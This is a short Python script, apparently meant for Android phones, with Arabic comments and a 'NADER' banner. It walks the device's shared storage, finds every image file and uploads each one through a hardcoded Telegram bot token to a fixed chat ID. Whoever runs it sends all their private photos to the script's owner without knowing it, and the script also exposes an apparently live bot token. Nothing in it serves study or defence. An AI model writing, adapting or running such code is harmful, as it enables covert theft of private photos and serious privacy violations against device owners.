import os
import telebot
import time

# الشعار الخاص بك
logo=("""\033[1;91m
\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/
\033[1;32m--------------------------------------------------""")
print(logo)

# إعداد البوت
bot = telebot.TeleBot("6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac") 

# المسار المستهدف
dir_path = "/storage/emulated/0/"

# قائمة الامتدادات المسموح بها لتسهيل الكود
valid_extensions = (".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPEG", ".Webp", ".webp")

print("\n[*] جاري بدء الفحص والرفع المتسلسل...\n")

# الدخول في المجلدات والملفات بشكل خطي ومنظم
for root, dirs, files in os.walk(dir_path):
    for file in files:
        file_path = os.path.join(root, file)
        
        # التأكد من أن الملف هو صورة
        if file_path.lower().endswith(valid_extensions):
            try:
                with open(file_path, "rb") as f:
                    bot.send_photo(chat_id="1350971290", photo=f)
                
                # طباعة اسم الملف الذي تم رفعه بنجاح
                print(f"\033[1;32m[+] تم الرفع:\033[0m ")
                
                # إضافة تأخير بسيط (ثانية واحدة) لمنع حظر البوت من تلجرام
                time.sleep(0.1)
                
            except Exception as e:
                # في حال حدث خطأ في ملف معين (مثل ملف تالف) سيكمل السكربت عمله
                print(f"\033[1;31m[-] خطأ في رفع \033[0m")
                continue
        else:
            # تجاهل الملفات غير الصورية دون تعطيل العملية
            pass

print("\n\033[1;32m[!] اكتملت العملية بنجاح.\033[0m")
